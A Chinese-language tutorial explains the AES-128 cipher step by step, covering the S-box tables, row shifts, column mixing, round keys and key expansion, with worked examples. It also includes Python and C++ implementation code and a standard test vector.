用来加密明文的密码，在对称加密算法中，加密与解密的密钥是相同的。密钥为接收方与发送方协商产生，但不可以直接在网络上传输，否则会导致密钥泄漏，通常是通过非对称加密算法加密密钥，然后再通过网络传输给对方，或者直接面对面商量密钥。密钥是绝对不可以泄漏的，否则会被攻击者还原密文，窃取机密数据。 AES加密函数 设AES加密函数为E，则 C = E(K, P),其中P为明文，K为密钥，C为密文。也就是说，把明文P和密钥K作为加密函数的参数输入，则加密函数E会输出密文C。 密文C 经加密函数处理后的数据 AES解密函数 设AES解密函数为D，则 P = D(K, C),其中C为密文，K为密钥，P为明文。也就是说，把密文C和密钥K作为解密函数的参数输入，则解密函数会输出明文P。 在这里简单介绍下对称加密算法与非对称加密算法的区别。 对称加密算法 加密和解密用到的密钥是相同的，这种加密方式加密速度非常快，适合经常发送数据的场合。缺点是密钥的传输比较麻烦。 非对称加密算法 加密和解密用的密钥是不同的，这种加密方式是用数学上的难解问题构造的，通常加密解密的速度比较慢，适合偶尔发送数据的场合。优点是密钥传输方便。常见的非对称加密算法为RSA、ECC和EIGamal。 实际中，一般是通过RSA加密AES的密钥，传输到接收方，接收方解密得到AES密钥，然后发送方和接收方用AES密钥来通信。 本文下面AES原理的介绍参考自《现代密码学教程》，AES的实现在介绍完原理后开始。 AES的基本结构AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示： AES 密钥长度（32位比特字) 分组长度(32位比特字) 加密轮数 AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。 上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。 AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示： 现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下： 上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。 类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示： 上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。 AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。 上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。 下面分别介绍AES中一轮的4个操作阶段，这4分操作阶段使输入位得到充分的混淆。 一、字节代换1.字节代换操作AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。 AES的S盒： 行/列 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 0x63 0x7c 0x77 0x7b 0xf2 0x6b 0x6f 0xc5 0x30 0x01 0x67 0x2b 0xfe 0xd7 0xab 0x76 1 0xca 0x82 0xc9 0x7d 0xfa 0x59 0x47 0xf0 0xad 0xd4 0xa2 0xaf 0x9c 0xa4 0x72 0xc0 2 0xb7 0xfd 0x93 0x26 0x36 0x3f 0xf7 0xcc 0x34 0xa5 0xe5 0xf1 0x71 0xd8 0x31 0x15 3 0x04 0xc7 0x23 0xc3 0x18 0x96 0x05 0x9a 0x07 0x12 0x80 0xe2 0xeb 0x27 0xb2 0x75 4 0x09 0x83 0x2c 0x1a 0x1b 0x6e 0x5a 0xa0 0x52 0x3b 0xd6 0xb3 0x29 0xe3 0x2f 0x84 5 0x53 0xd1 0x00 0xed 0x20 0xfc 0xb1 0x5b 0x6a 0xcb 0xbe 0x39 0x4a 0x4c 0x58 0xcf 6 0xd0 0xef 0xaa 0xfb 0x43 0x4d 0x33 0x85 0x45 0xf9 0x02 0x7f 0x50 0x3c 0x9f 0xa8 7 0x51 0xa3 0x40 0x8f 0x92 0x9d 0x38 0xf5 0xbc 0xb6 0xda 0x21 0x10 0xff 0xf3 0xd2 8 0xcd 0x0c 0x13 0xec 0x5f 0x97 0x44 0x17 0xc4 0xa7 0x7e 0x3d 0x64 0x5d 0x19 0x73 9 0x60 0x81 0x4f 0xdc 0x22 0x2a 0x90 0x88 0x46 0xee 0xb8 0x14 0xde 0x5e 0x0b 0xdb A 0xe0 0x32 0x3a 0x0a 0x49 0x06 0x24 0x5c 0xc2 0xd3 0xac 0x62 0x91 0x95 0xe4 0x79 B 0xe7 0xc8 0x37 0x6d 0x8d 0xd5 0x4e 0xa9 0x6c 0x56 0xf4 0xea 0x65 0x7a 0xae 0x08 C 0xba 0x78 0x25 0x2e 0x1c 0xa6 0xb4 0xc6 0xe8 0xdd 0x74 0x1f 0x4b 0xbd 0x8b 0x8a D 0x70 0x3e 0xb5 0x66 0x48 0x03 0xf6 0x0e 0x61 0x35 0x57 0xb9 0x86 0xc1 0x1d 0x9e E 0xe1 0xf8 0x98 0x11 0x69 0xd9 0x8e 0x94 0x9b 0x1e 0x87 0xe9 0xce 0x55 0x28 0xdf F 0x8c 0xa1 0x89 0x0d 0xbf 0xe6 0x42 0x68 0x41 0x99 0x2d 0x0f 0xb0 0x54 0xbb 0x16 状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下： 2.字节代换逆操作逆字节代换也就是查逆S盒来变换，逆S盒如下： 行/列 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 0x52 0x09 0x6a 0xd5 0x30 0x36 0xa5 0x38 0xbf 0x40 0xa3 0x9e 0x81 0xf3 0xd7 0xfb 1 0x7c 0xe3 0x39 0x82 0x9b 0x2f 0xff 0x87 0x34 0x8e 0x43 0x44 0xc4 0xde 0xe9 0xcb 2 0x54 0x7b 0x94 0x32 0xa6 0xc2 0x23 0x3d 0xee 0x4c 0x95 0x0b 0x42 0xfa 0xc3 0x4e 3 0x08 0x2e 0xa1 0x66 0x28 0xd9 0x24 0xb2 0x76 0x5b 0xa2 0x49 0x6d 0x8b 0xd1 0x25 4 0x72 0xf8 0xf6 0x64 0x86 0x68 0x98 0x16 0xd4 0xa4 0x5c 0xcc 0x5d 0x65 0xb6 0x92 5 0x6c 0x70 0x48 0x50 0xfd 0xed 0xb9 0xda 0x5e 0x15 0x46 0x57 0xa7 0x8d 0x9d 0x84 6 0x90 0xd8 0xab 0x00 0x8c 0xbc 0xd3 0x0a 0xf7 0xe4 0x58 0x05 0xb8 0xb3 0x45 0x06 7 0xd0 0x2c 0x1e 0x8f 0xca 0x3f 0x0f 0x02 0xc1 0xaf 0xbd 0x03 0x01 0x13 0x8a 0x6b 8 0x3a 0x91 0x11 0x41 0x4f 0x67 0xdc 0xea 0x97 0xf2 0xcf 0xce 0xf0 0xb4 0xe6 0x73 9 0x96 0xac 0x74 0x22 0xe7 0xad 0x35 0x85 0xe2 0xf9 0x37 0xe8 0x1c 0x75 0xdf 0x6e A 0x47 0xf1 0x1a 0x71 0x1d 0x29 0xc5 0x89 0x6f 0xb7 0x62 0x0e 0xaa 0x18 0xbe 0x1b B 0xfc 0x56 0x3e 0x4b 0xc6 0xd2 0x79 0x20 0x9a 0xdb 0xc0 0xfe 0x78 0xcd 0x5a 0xf4 C 0x1f 0xdd 0xa8 0x33 0x88 0x07 0xc7 0x31 0xb1 0x12 0x10 0x59 0x27 0x80 0xec 0x5f D 0x60 0x51 0x7f 0xa9 0x19 0xb5 0x4a 0x0d 0x2d 0xe5 0x7a 0x9f 0x93 0xc9 0x9c 0xef E 0xa0 0xe0 0x3b 0x4d 0xae 0x2a 0xf5 0xb0 0xc8 0xeb 0xbb 0x3c 0x83 0x53 0x99 0x61 F 0x17 0x2b 0x04 0x7e 0xba 0x77 0xd6 0x26 0xe1 0x69 0x14 0x63 0x55 0x21 0x0c 0x7d 二、行移位1.行移位操作行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示： 2.行移位的逆变换行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。 三、列混合1.列混合操作列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示： 状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示： 其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。这里涉及到一些信息安全上的数学知识，不过不懂这些知识也行。其实这种二元运算的加法等价于两个字节的异或，乘法则复杂一点。对于一个8位的二进制数来说，使用域上的乘法乘以(00000010)等价于左移1位(低位补0)后，再根据情况同(00011011)进行异或运算，设S1 = (a7 a6 a5 a4 a3 a2 a1 a0)，刚0x02 * S1如下图所示： 也就是说，如果a7为1，则进行异或运算，否则不进行。 类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算： 乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或： 因此，我们只需要实现乘以2的函数，其他数值的乘法都可以通过组合来实现。 下面举个具体的例子,输入的状态矩阵如下： C9 E5 FD 2B 7A F2 78 6E 63 9C 26 67 B0 A7 82 E5 下面，进行列混合运算： 以第一列的运算为例： 其它列的计算就不列举了，列混合后生成的新状态矩阵如下： D4 E7 CD 66 28 02 E5 BB BE C6 D6 BF 22 0F DF A5 2.列混合逆运算逆向列混合变换可由下图的矩阵乘法定义： 可以验证，逆变换矩阵同正变换矩阵的乘积恰好为单位矩阵。 四、轮密钥加轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算。 轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。 五、密钥扩展AES首先将初始密钥输入到一个44的状态矩阵中，如下图所示。 这个44矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0 = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = “abcd”。 接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生： 1.如果i不是4的倍数，那么第i列由如下等式确定： W[i]=W[i-4]⨁W[i-1] 2.如果i是4的倍数，那么第i列由如下等式确定： W[i]=W[i-4]⨁T(W[i-1]) 其中，T是一个有点复杂的函数。 函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。 a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。 b.字节代换：对字循环的结果使用S盒进行字节代换。 c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。 轮常量Rcon[j]是一个字，其值见下表。 j 1 2 3 4 5 Rcon[j] 01 00 00 00 02 00 00 00 04 00 00 00 08 00 00 00 10 00 00 00 j 6 7 8 9 10 Rcon[j] 20 00 00 00 40 00 00 00 80 00 00 00 1B 00 00 00 36 00 00 00 下面举个例子： 设初始的128位密钥为： 3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD 那么4个初始值为： W[0] = 3C A1 0B 21 W[1] = 57 F0 19 16 W[2] = 90 2E 13 80 W[3] = AC C1 07 BD 下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。 由于4是4的倍数，所以： W[4] = W[0] ⨁ T(W[3]) T(W[3])的计算步骤如下： \\1. 循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC; \\2. 将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91; \\3. 将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])=79 C5 7A 91，故 W[4] = 3C A1 0B 21 ⨁ 79 C5 7A 91 = 45 64 71 B0 其余的3个子密钥段的计算如下： W[5] = W[1] ⨁ W[4] = 57 F0 19 16 ⨁ 45 64 71 B0 = 12 94 68 A6 W[6] = W[2] ⨁ W[5] =90 2E 13 80 ⨁ 12 94 68 A6 = 82 BA 7B 26 W[7] = W[3] ⨁ W[6] = AC C1 07 BD ⨁ 82 BA 7B 26 = 2E 7B 7C 9B 所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B。 六、AES解密在文章开始的图中，有AES解密的流程图，可以对应那个流程图来进行解密。下面介绍的是另一种等价的解密模式，流程图如下图所示。这种等价的解密模式使得解密过程各个变换的使用顺序同加密过程的顺序一致，只是用逆变换取代原来的变换。 软件系统设计XTime运算1xtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1) 字节替代1234def __sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = Sbox[s[i][j]] AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒,状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出 逆字节替换1234def __inv_sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = InvSbox[s[i][j]] 行移位变换 1234def __shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3] 逆行移位变换1234def __inv_shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3] 单列列混淆变换 1234567def __mix_single_column(self, a): t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u) 列混淆变换123def __mix_columns(self, s): for i in range(4): self.__mix_single_column(s[i]) 逆混淆列变换123456789def __inv_mix_columns(self, s): for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v self.__mix_columns(s) 密钥处理轮密钥加变换1234def __add_round_key(self, s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j] 密钥扩展将输入的密钥扩展为11组128位密钥组，其中第0组为输入密钥本身 其后第n组第i列 为 第n-1组第i列 与 第n组第i-1列之和（模2加法，1&lt;= i &lt;=3） 对于每一组 第一列即i=0，有特殊的处理 将前一列即第n-1组第3列的4个字节循环左移1个字节， 并对每个字节进行字节替代变换SubBytes 将第一行（即第一个字节）与轮常量rc[n]相加 最后再与前一组该列相加 1234567891011121314151617181920def __init__(self, master_key): self.change_key(master_key)def change_key(self, master_key): self.round_keys = text2matrix(master_key) for i in range(4, 4 * 11): self.round_keys.append([]) if i % 4 == 0: byte = self.round_keys[i - 4][0] \\ ^ Sbox[self.round_keys[i - 1][1]] \\ ^ Rcon[int(i/4)] self.round_keys[i].append(byte) for j in range(1, 4): byte = self.round_keys[i - 4][j] \\ ^ Sbox[self.round_keys[i - 1][(j + 1) % 4]] self.round_keys[i].append(byte) else: for j in range(4): byte = self.round_keys[i - 4][j] \\ ^ self.round_keys[i - 1][j] self.round_keys[i].append(byte) 加密函数123456789def encrypt(self, plaintext): self.plain_state = text2matrix(plaintext) self.__add_round_key(self.plain_state, self.round_keys[:4]) for i in range(1, 10): self.__round_encrypt(self.plain_state, self.round_keys[4 * i : 4 * (i + 1)]) self.__sub_bytes(self.plain_state) self.__shift_rows(self.plain_state) self.__add_round_key(self.plain_state, self.round_keys[40:]) return matrix2text(self.plain_state) 解密函数123456789def decrypt(self, ciphertext): self.cipher_state = text2matrix(ciphertext) self.__add_round_key(self.cipher_state, self.round_keys[40:]) self.__inv_shift_rows(self.cipher_state) self.__inv_sub_bytes(self.cipher_state) for i in range(9, 0, -1): self.__round_decrypt(self.cipher_state, self.round_keys[4 * i : 4 * (i + 1)]) self.__add_round_key(self.cipher_state, self.round_keys[:4]) return matrix2text(self.cipher_state) AES的S盒参考了GitHub和看雪论坛的代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include \"MatrixGF2.h\"#include \"PolynomialGF2.h\"MatrixGF2&lt;BYTE&gt; g_mtxPositiveBox(16, 16, 0);MatrixGF2&lt;BYTE&gt; g_mtxReverseBox(16, 16, 0);MatrixGF2&lt;BYTE&gt; g_mtxBytePositiveTransformMatrix(8, 8, 0);MatrixGF2&lt;BYTE&gt; g_mtxByteReverseTransformMatrix(8, 8, 0);BYTE g_bytPositiveFixed = 0;BYTE g_bytReverseFixed = 0;PolynomialGF2 g_polyModle; #define MAKEBYTE(_high, _low) (((_high) &lt;&lt; 4) | (_low)) PolynomialGF2 PolynomialEuclidEx(const PolynomialGF2 &amp;kref_polyA, const PolynomialGF2 &amp;kref_polyB, PolynomialGF2 &amp;ref_polyX, PolynomialGF2 &amp;ref_polyY)&#123; if (kref_polyB.EqualZero()) &#123; throw std::runtime_error(\"zero!\"); &#125; int iHighestBitIndex = kref_polyA.GetHightestBitIndex(); PolynomialGF2 polyQuotient(iHighestBitIndex + 1, 0); PolynomialGF2 polyRemainder(iHighestBitIndex + 1, 0); PolynomialGF2 polyLastLastX(iHighestBitIndex + 1, 0); polyLastLastX = 1; PolynomialGF2 polyLastLastY(iHighestBitIndex + 1, 0); PolynomialGF2 polyLastLastRemainder = kref_polyA; PolynomialGF2 polyLastX(iHighestBitIndex + 1, 0); PolynomialGF2 polyLastY(iHighestBitIndex + 1, 0); polyLastY = 1; PolynomialGF2 polyLastRemainder = kref_polyB; ref_polyX.Clear(); ref_polyY.Clear(); ref_polyX.Insert(0, iHighestBitIndex + 1, 0); ref_polyY.Insert(0, iHighestBitIndex + 1, 0); ref_polyY = 1; do &#123; polyLastLastRemainder.Division(polyLastRemainder, polyQuotient, polyRemainder); if (polyRemainder.EqualZero()) &#123; break; &#125; ref_polyX = polyLastLastX - polyLastX * polyQuotient; ref_polyY = polyLastLastY - polyLastY * polyQuotient; polyLastLastRemainder = polyLastRemainder; polyLastRemainder = polyRemainder; polyLastLastX = polyLastX; polyLastLastY = polyLastY; polyLastX = ref_polyX; polyLastY = ref_polyY; &#125; while (TRUE); return polyLastRemainder;&#125; void InitByteTransformMatrix(PolynomialGF2 &amp;ref_polyInit, MatrixGF2&lt;BYTE&gt; &amp;ref_mtxTarget)&#123; size_t uiColumnNumber = ref_mtxTarget.GetColumnNumber(); if (ref_polyInit.GetSize() != ref_mtxTarget.GetColumnNumber()) &#123; ref_polyInit.PaddingZero(uiColumnNumber); &#125; size_t uiRowNumber = uiColumnNumber; for (size_t cntY = 0; cntY &lt; uiRowNumber; cntY++) &#123; size_t iOffset = cntY; for (size_t cntX = 0; cntX &lt; uiColumnNumber; cntX++) &#123; size_t iActualPos = cntX + iOffset; if (iActualPos &gt;= uiColumnNumber) &#123; iActualPos -= uiColumnNumber; &#125; ref_mtxTarget[cntY][iActualPos] = ref_polyInit[cntX]; &#125; &#125;&#125; void InitPositiveBox()&#123; MatrixGF2&lt;BYTE&gt; mtxFixed = PolynomialGF2(g_bytPositiveFixed).GetDequeFormat(); for (size_t cntY = 0; cntY &lt; 16; cntY++) &#123; for (size_t cntX = 0; cntX &lt; 16; cntX++) &#123; BYTE bytSource = (BYTE)MAKEBYTE(cntY, cntX); if (0 == bytSource) &#123; g_mtxPositiveBox[cntY][cntX] = g_bytPositiveFixed; continue; &#125; PolynomialGF2 polyInverseElement; PolynomialGF2 polyX; PolynomialGF2 polySource = bytSource; if (!polySource.EqualZero()) &#123; PolynomialGF2 polyResult = PolynomialEuclidEx(g_polyModle, polySource, polyX, polyInverseElement); &#125; else &#123; polyInverseElement = &#123; 0 &#125;; &#125; polyInverseElement.ClearInvalidZero(); MatrixGF2&lt;BYTE&gt; mtxValue = polyInverseElement.GetDequeFormat(); mtxValue.PaddingRow( g_mtxBytePositiveTransformMatrix.GetColumnNumber() ); mtxFixed.PaddingRow(mtxValue.GetRowNumber()); mtxValue = g_mtxBytePositiveTransformMatrix * mtxValue + mtxFixed; g_mtxPositiveBox[cntY][cntX] = (BYTE)PolynomialGF2(mtxValue.Transform2Vector()).ToNumber(); &#125; &#125;&#125;void InitReverseBox()&#123; MatrixGF2&lt;BYTE&gt; mtxFixed = PolynomialGF2(g_bytReverseFixed).GetDequeFormat(); for (size_t cntY = 0; cntY &lt; 16; cntY++) &#123; for (size_t cntX = 0; cntX &lt; 16; cntX++) &#123; BYTE bytSource = (BYTE)MAKEBYTE(cntY, cntX); MatrixGF2&lt;BYTE&gt; mtxValue = bytSource; int iValueColumnNumber = g_mtxByteReverseTransformMatrix.GetColumnNumber(); if (0 == bytSource) &#123; mtxValue.InsertRow(0, iValueColumnNumber, 1, 0); &#125; mtxValue.PaddingRow(iValueColumnNumber); mtxFixed.PaddingRow(mtxValue.GetRowNumber()); mtxValue = g_mtxByteReverseTransformMatrix * mtxValue + mtxFixed; PolynomialGF2 polyInverseElement; PolynomialGF2 polyX; PolynomialGF2 polyValue = mtxValue.Transform2Vector(); if (!polyValue.EqualZero()) &#123; PolynomialGF2 polyResult = PolynomialEuclidEx(g_polyModle, polyValue, polyX, polyInverseElement); &#125; else &#123; polyInverseElement = &#123; 0 &#125;; &#125; g_mtxReverseBox[cntY][cntX] = (BYTE)polyInverseElement.ToNumber(); &#125; &#125;&#125; void InitStandardBox()&#123; g_polyModle = &#123; 1, 1, 0, 1, 1, 0, 0, 0, 1 &#125;; PolynomialGF2 polyPositiveSeed = &#123; 1, 0, 0, 0, 1, 1, 1, 1 &#125;; InitByteTransformMatrix(polyPositiveSeed, g_mtxBytePositiveTransformMatrix); PolynomialGF2 polyReverseSeed = &#123; 0, 0, 1, 0, 0, 1, 0, 1 &#125;; InitByteTransformMatrix(polyReverseSeed, g_mtxByteReverseTransformMatrix); g_bytPositiveFixed = 0x63; g_bytReverseFixed = 0x05; InitPositiveBox(); InitReverseBox(); printf(\"Positive box: \\n%s\\n\", g_mtxPositiveBox.GetWrittenFormat().c_str()); printf(\"Reverse box: \\n%s\\n\", g_mtxReverseBox.GetWrittenFormat().c_str());&#125; int main()&#123; InitStandardBox(); return 0;&#125; 重要的实现细节GF2域上的计算123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131PolynomialGF2 &amp;PolynomialGF2::operator=(const PolynomialGF2 &amp;kref_polyRight)&#123; m_deqPolynomial = kref_polyRight.m_deqPolynomial; return *this;&#125; PolynomialGF2 &amp;PolynomialGF2::operator=(PolynomialGF2 &amp;&amp;rvalue_polyRight)&#123; m_deqPolynomial = std::move(rvalue_polyRight.m_deqPolynomial); return *this;&#125; PolynomialGF2 PolynomialGF2::operator+(const PolynomialGF2 &amp;ref_polyRight)&#123; PolynomialGF2 polyResult = *this; int iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex(); int iLeftHeighestBitIext = polyResult.GetHightestBitIndex(); if (iRightHeighestBitIndex &gt; iLeftHeighestBitIext) &#123; int iGap = iRightHeighestBitIndex - iLeftHeighestBitIext; polyResult.Insert(iLeftHeighestBitIext + 1, iGap, 0); &#125; for (size_t cntI = 0; cntI &lt; (size_t)(iRightHeighestBitIndex + 1); cntI++) &#123; polyResult[cntI] ^= ref_polyRight[cntI]; &#125; return polyResult;&#125; PolynomialGF2 PolynomialGF2::operator-(const PolynomialGF2 &amp;ref_polyRight)&#123; PolynomialGF2 polyResult = *this; int iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex(); int iLeftHeighestBitIext = polyResult.GetHightestBitIndex(); if (iRightHeighestBitIndex &gt; iLeftHeighestBitIext) &#123; int iGap = iRightHeighestBitIndex - iLeftHeighestBitIext; polyResult.Insert(iLeftHeighestBitIext + 1, iGap, 0); &#125; for (size_t cntI = 0; cntI &lt; ref_polyRight.GetSize(); cntI++) &#123; polyResult[cntI] ^= ref_polyRight[cntI]; &#125; return polyResult;&#125; PolynomialGF2 PolynomialGF2::operator-(const PolynomialGF2 &amp;ref_polyRight) const&#123; PolynomialGF2 polyResult = *this; int iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex(); int iLeftHeighestBitIext = polyResult.GetHightestBitIndex(); if (iRightHeighestBitIndex &gt; iLeftHeighestBitIext) &#123; int iGap = iRightHeighestBitIndex - iLeftHeighestBitIext; polyResult.Insert(iLeftHeighestBitIext + 1, iGap, 0); &#125; for (size_t cntI = 0; cntI &lt; ref_polyRight.GetSize(); cntI++) &#123; polyResult[cntI] ^= ref_polyRight[cntI]; &#125; return polyResult;&#125; PolynomialGF2 PolynomialGF2::operator*(const PolynomialGF2 &amp;ref_polyRight)&#123; PolynomialGF2 polyResult; for (size_t cntI = 0; cntI &lt; ref_polyRight.GetSize(); cntI++) &#123; PolynomialGF2 polyTmp = *this; if (1 == ref_polyRight[cntI]) &#123; polyTmp.Insert(0, cntI, 0); polyResult = polyResult + polyTmp; &#125; &#125; return polyResult;&#125; PolynomialGF2 PolynomialGF2::operator/(const PolynomialGF2 &amp;kref_right)&#123; return *this;&#125; //! Polynomial::operator/() ENDPolynomialGF2 PolynomialGF2::operator%(const PolynomialGF2 &amp;kref_polyRight)&#123; PolynomialGF2 polyResult; int iLeftHightestBitIndex = GetHightestBitIndex(); int iRightHightestBitIndex = kref_polyRight.GetHightestBitIndex(); if (iLeftHightestBitIndex == iRightHightestBitIndex) &#123; polyResult = kref_polyRight - *this; &#125; else if (iLeftHightestBitIndex &lt; iRightHightestBitIndex) &#123; polyResult = *this; &#125; else if (iLeftHightestBitIndex &gt; iRightHightestBitIndex) &#123; PolynomialGF2 polyQuotient; Division(kref_polyRight, polyQuotient, polyResult); &#125; return polyResult;&#125; PolynomialGF2 &amp;PolynomialGF2::operator&lt;&lt;=(const size_t &amp;kref_uiNumber)&#123; m_deqPolynomial.insert(m_deqPolynomial.cbegin(), kref_uiNumber, 0); if (m_bEnableLeftMoveLimit &amp;&amp; GetHightestBitIndex() &gt;= (int)m_uiLeftMoveLimitBit) &#123; m_deqPolynomial.erase(std::next(m_deqPolynomial.cbegin(), m_uiLeftMoveLimitBit), m_deqPolynomial.cend()); &#125; return *this;&#125; PolynomialGF2 &amp;PolynomialGF2::operator^=(const PolynomialGF2 &amp;kref_polyRight)&#123; size_t uiheighBit = 0; size_t uiLeftSize = m_deqPolynomial.size(); size_t uiRightSize = kref_polyRight.GetSize(); size_t uiOperationSize = uiLeftSize; if (uiLeftSize &gt; uiRightSize) &#123; uiOperationSize = uiRightSize; &#125; for (size_t cntI = 0; cntI &lt; uiOperationSize; cntI++) &#123; m_deqPolynomial[cntI] ^= kref_polyRight[cntI]; &#125; return *this;&#125; 实现效果12345master_key = 0x2b7e151628aed2a6abf7158809cf4f3cplaintext = 0x3243f6a8885a308d313198a2e0370734ciphertext = 0x3925841d02dc09fbdc118597196a0b32encrypt：0x3925841d02dc09fbdc118597196a0b32decrypt：0x3243f6a8885a308d313198a2e0370734 